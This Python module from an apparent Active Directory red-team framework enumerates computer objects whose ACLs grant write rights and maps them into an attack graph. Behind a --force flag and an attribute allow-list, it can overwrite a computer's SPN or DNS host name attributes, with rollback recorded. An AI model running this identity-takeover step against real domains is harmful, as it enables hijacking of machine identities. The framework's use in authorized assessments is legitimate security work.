"""Computer-object identity takeover surface discovery."""

from __future__ import annotations

import json
from typing import Any

from ldap3 import MODIFY_REPLACE, SUBTREE

from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import ldap_filter_value
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target


@register_capability(
    id="computer-takeover",
    summary="Identify writable computer SPN and DNS identity surfaces",
    category="enumeration",
    tags=("computer", "spn", "dns", "acl"),
)
class ComputerTakeover:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        conn, base_dn, _cfg = ldap_connect(target)
        hits: list[dict[str, str]] = []
        conn.search(
            base_dn,
            "(objectClass=computer)",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "distinguishedName"],
            size_limit=int(kwargs.get("max_objects") or 500),
        )
        for entry in conn.entries:
            sam, dn = str(entry.sAMAccountName), str(entry.distinguishedName)
            descriptor = fetch_sd(conn, dn)
            if descriptor:
                for ace in parse_interesting_aces(descriptor):
                    if ace.right in {
                        "GenericAll",
                        "GenericWrite",
                        "WriteProperty",
                        "WriteDacl",
                        "WriteOwner",
                    }:
                        hits.append(
                            {
                                "computer": sam,
                                "dn": dn,
                                "principal_sid": ace.principal_sid,
                                "right": ace.right,
                            }
                        )
                        graph.add_edge(
                            f"SID@{ace.principal_sid}",
                            f"COMPUTER@{sam.upper()}@{target.domain.upper()}",
                            "WriteComputerIdentity",
                            right=ace.right,
                        )
        change_target, attribute, value = (
            kwargs.get("write_target"),
            kwargs.get("attribute"),
            kwargs.get("value"),
        )
        change = None
        if change_target or attribute or value:
            if not force or not all((change_target, attribute, value)):
                raise RuntimeError(
                    "Approved identity change requires --force, --write-target, --attribute, and --value"
                )
            if attribute not in {
                "servicePrincipalName",
                "dNSHostName",
                "msDS-AdditionalDnsHostName",
            }:
                raise RuntimeError("Attribute is not approved for this capability")
            conn.search(
                base_dn,
                f"(sAMAccountName={ldap_filter_value(change_target)})",
                search_scope=SUBTREE,
                attributes=["distinguishedName", attribute],
            )
            if not conn.entries:
                raise RuntimeError("Computer target not found")
            entry = conn.entries[0]
            old = [str(item) for item in (entry[attribute].value or [])] if entry[attribute] else []
            ok = conn.modify(str(entry.distinguishedName), {attribute: [(MODIFY_REPLACE, [value])]})
            change = {
                "target": str(entry.distinguishedName),
                "attribute": attribute,
                "ok": bool(ok),
            }
            if ok:
                session.register_cleanup(
                    {
                        "kind": "computer-identity",
                        "target": str(entry.distinguishedName),
                        "attribute": attribute,
                        "previous": old,
                        "rollback": "Restore the recorded attribute value.",
                    }
                )
        conn.unbind()
        result = {
            "domain": target.domain,
            "identity_attributes": [
                "servicePrincipalName",
                "dNSHostName",
                "msDS-AdditionalDnsHostName",
            ],
            "hits": hits,
            "count": len(hits),
            "change": change,
        }
        session.path("computer-takeover.json").write_text(
            json.dumps(result, indent=2) + "\n", encoding="utf-8"
        )
        graph.save(session.path("graph.json"))
        session.log("computer-takeover.complete", count=len(hits))
        return result
